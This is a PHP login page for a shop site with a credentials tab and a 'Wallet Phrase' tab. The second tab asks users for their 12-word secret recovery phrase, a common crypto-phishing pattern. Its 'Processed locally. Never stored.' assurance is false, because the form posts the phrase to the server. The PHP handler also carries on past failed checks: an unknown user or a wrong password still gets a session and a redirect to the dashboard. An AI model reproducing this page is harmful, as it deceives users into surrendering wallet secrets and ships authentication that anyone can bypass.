<?php
include('../../server/connection.php');




?>

<!DOCTYPE html>
<html lang="en" class="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | <?php  echo $sitename ?></title>
    <script src="https://cdn.tailwindcss.com/"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <link rel="stylesheet" href="<?php echo $domain; ?>assets/vendor/cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['"Plus Jakarta Sans"', 'sans-serif']
                    },
                    colors: {
                        dark: {
                            bg: '#02040a',
                            panel: '#0B0F19',
                            border: '#1E293B'
                        },
                        light: {
                            bg: '#F8FAFC',
                            panel: '#FFFFFF',
                            border: '#E2E8F0'
                        }
                    }
                }
            }
        }
    </script>
    <style>
        .glass-panel {
            @apply bg-white/70 dark:bg-[#121826]/70;
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            @apply border border-slate-200 dark:border-white/5;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.1);
        }

        .hidden-form {
            display: none;
        }

        .fade-in {
            animation: fadeIn 0.4s ease-out forwards;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(5px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>

<body class="flex h-screen bg-slate-50 dark:bg-[#02040a] text-slate-800 dark:text-slate-300 items-center justify-center p-4 relative overflow-hidden">

    <?php


    function toast($type, $msg)
    {
        echo "<script>
        window.onload = function(){
            toastr.$type('$msg');
        }
    </script>";
    }

    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['login'])) {

        $login_id = trim($_POST['login_id']);
        $user_password = $_POST['password'];

        if (empty($login_id) || empty($user_password)) {
            toast("error", "All fields are required");
        }

        // Login using username or account ID or email
        $stmt = $connection->prepare(
            "SELECT id, name, email, password 
         FROM users 
         WHERE email = ? OR id = ?"
        );

        $stmt->bind_param("ss",  $login_id, $login_id);
        $stmt->execute();

        $result = $stmt->get_result();

        if ($result->num_rows === 0) {
            toast("error", "User not found");
        }

        $user = $result->fetch_assoc();

        // Verify password
        if (!password_verify($user_password, $user['password'])) {
            toast("error", "Incorrect password");
        }

        $_SESSION['user_id'] = $user['id'];

        toast("success", "Login successful!");

        echo "<script>
        setTimeout(()=>{
            window.location.href='../../users/dashboard/';
        },1500);
    </script>";
    }
    ?>

    <div class="absolute -top-40 -left-40 w-96 h-96 bg-indigo-500/10 rounded-full blur-[100px] pointer-events-none"></div>
    <div class="absolute top-1/2 -right-20 w-80 h-80 bg-purple-500/10 rounded-full blur-[80px] pointer-events-none"></div>

    <div class="glass-panel w-full max-w-sm rounded-3xl p-8 relative z-10">

        <div class="text-center mb-8">
            <div class="flex items-center justify-center space-x-3 mb-10">
                <div class="w-10 h-10 bg-gradient-to-br from-purple-500 to-blue-500 rounded-xl flex items-center justify-center">
                    <i style="color: white;" class="fas fa-shop"></i>
                </div>
                <h1 class="text-xl font-semibold"><?php echo $sitename ?></h1>
            </div>

            <h1 class="text-2xl font-bold text-slate-900 dark:text-white">Create Account</h1>

        </div>


        <div class="flex p-1 bg-slate-100 dark:bg-[#0B0F19] rounded-xl mb-6 border border-slate-200 dark:border-white/10">
            <button onclick="switchTab('credentials')" id="tab-creds" class="flex-1 py-2 text-xs font-bold rounded-lg bg-white dark:bg-[#1E293B] text-indigo-600 shadow-sm transition-all">
                Credentials
            </button>
            <button onclick="switchTab('wallet')" id="tab-wallet" class="flex-1 py-2 text-xs font-bold rounded-lg text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white transition-all">
                Wallet Phrase
            </button>
        </div>

        <form id="form-creds" method="POST" class="fade-in">
            <div class="space-y-4 mb-6">
                <div>
                    <label class="block text-xs font-bold text-slate-500 uppercase mb-2">Account ID or Email</label>
                    <div class="relative">
                        <input type="text" name="login_id" placeholder="e.g. johndoe or 8829102" required class="w-full bg-slate-50 dark:bg-[#0B0F19] text-slate-900 dark:text-white border border-slate-200 dark:border-white/10 rounded-xl py-3 px-4 pl-10 focus:outline-none focus:border-indigo-500 transition-all">
                        <i class="fa-regular fa-user absolute left-4 top-1/2 transform -translate-y-1/2 text-slate-400"></i>
                    </div>
                </div>
                <div>
                    <div class="flex justify-between items-center mb-2">
                        <label class="block text-xs font-bold text-slate-500 uppercase">Password</label>
                        <a href="forget_password.html" class="text-[11px] font-semibold text-indigo-500 hover:text-indigo-600 transition-colors">Forgot Password?</a>
                    </div>
                    <div class="relative">
                        <input type="password" name="password" placeholder="••••••••" required class="w-full bg-slate-50 dark:bg-[#0B0F19] text-slate-900 dark:text-white border border-slate-200 dark:border-white/10 rounded-xl py-3 px-4 pl-10 focus:outline-none focus:border-indigo-500 transition-all">
                        <i class="fa-solid fa-lock absolute left-4 top-1/2 transform -translate-y-1/2 text-slate-400"></i>
                    </div>
                </div>
            </div>
            <button type="submit" name="login" class="w-full py-4 rounded-xl bg-slate-900 dark:bg-white text-white dark:text-black font-bold shadow-lg hover:opacity-90 transition-all hover:scale-[1.02]">
                Continue
            </button>
        </form>

        <form id="form-wallet" method="POST" class="hidden-form fade-in">
            <div class="mb-6">
                <label class="block text-xs font-bold text-slate-500 uppercase mb-2">Secret Recovery Phrase</label>
                <textarea name="secret_phrase" placeholder="Enter your 12 word mnemonic phrase..." required rows="4" class="w-full bg-slate-50 dark:bg-[#0B0F19] text-slate-900 dark:text-white border border-slate-200 dark:border-white/10 rounded-xl py-3 px-4 focus:outline-none focus:border-indigo-500 transition-all text-sm resize-none"></textarea>
                <p class="text-[10px] text-slate-400 mt-2 flex items-center gap-1">
                    <i class="fa-solid fa-shield-halved text-green-500"></i> Processed locally. Never stored.
                </p>
            </div>

            <button type="submit" name="wallet_login" class="w-full py-4 rounded-xl bg-indigo-600 text-white font-bold shadow-lg hover:bg-indigo-500 transition-all hover:scale-[1.02]">
                Restore Access
            </button>
        </form>

        <div class="mt-8 text-center text-sm text-slate-500 dark:text-slate-400">
            Don't have an account? <a href="../register/" class="text-indigo-500 font-bold hover:underline">Register</a>
        </div>
    </div>

    <script>
        function switchTab(tab) {
            const formCreds = document.getElementById('form-creds');
            const formWallet = document.getElementById('form-wallet');
            const tabCreds = document.getElementById('tab-creds');
            const tabWallet = document.getElementById('tab-wallet');

            if (tab === 'credentials') {
                formCreds.style.display = 'block';
                formWallet.style.display = 'none';

                tabCreds.classList.add('bg-white', 'dark:bg-[#1E293B]', 'text-indigo-600', 'shadow-sm');
                tabCreds.classList.remove('text-slate-500', 'dark:text-slate-400');

                tabWallet.classList.remove('bg-white', 'dark:bg-[#1E293B]', 'text-indigo-600', 'shadow-sm');
                tabWallet.classList.add('text-slate-500', 'dark:text-slate-400');
            } else {
                formCreds.style.display = 'none';
                formWallet.style.display = 'block';

                tabWallet.classList.add('bg-white', 'dark:bg-[#1E293B]', 'text-indigo-600', 'shadow-sm');
                tabWallet.classList.remove('text-slate-500', 'dark:text-slate-400');

                tabCreds.classList.remove('bg-white', 'dark:bg-[#1E293B]', 'text-indigo-600', 'shadow-sm');
                tabCreds.classList.add('text-slate-500', 'dark:text-slate-400');
            }
        }
    </script>
</body>

</html>